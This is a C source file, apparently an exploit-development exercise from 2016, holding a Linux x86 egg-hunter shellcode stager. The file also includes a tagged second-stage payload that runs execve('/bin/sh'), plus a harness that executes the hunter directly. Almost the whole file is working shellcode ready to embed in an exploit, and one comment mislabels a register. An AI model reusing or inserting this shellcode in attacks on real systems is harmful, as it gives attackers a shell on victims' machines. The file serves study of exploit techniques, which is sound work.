/* 
Egg Hunter for Linux x86
Sanjiv Kawa (@skawasec)
www.popped.io
December 4, 2016
*/

#include<stdio.h>
#include<string.h>

#define EGG "\x4b\x53\x4b\x53" //SKSK

char egg[] = EGG;

unsigned char egg_hunter[] = \
                              "\xfc"	   	           	// cld
                              "\x31\xc0"	           	// xor eax,eax
                              "\x31\xd2"          		// xor ebx,ebx	
                              "\x66\x81\xca\xff\x0f"		// or dx,0xfff
                              "\x42"		            	// inc edx
                              "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
                              "\xb8\x21\x00\x00\x00"		// mov eax,0x21
                              "\xcd\x80"		        // int 0x80
                              "\x3c\xf2"		        // cmp al,0xf2
                              "\x74\xec"		        // je next_page
                              "\xb8" EGG		        // mov EGG
                              "\x89\xd7"		        // mov edi,edx
                              "\xaf"			        // scasd
                              "\x75\xe7"		        // jne increment_address
                              "\xaf"			        // scasd
                              "\x75\xe4"		        // jne increment_address 
                              "\xff\xe7";		        // jmp edi


unsigned char second_stage[] = \
                                EGG 
                                EGG 
                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack

main()
{
  printf("[+] Searching for: %s\n", EGG);
  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}
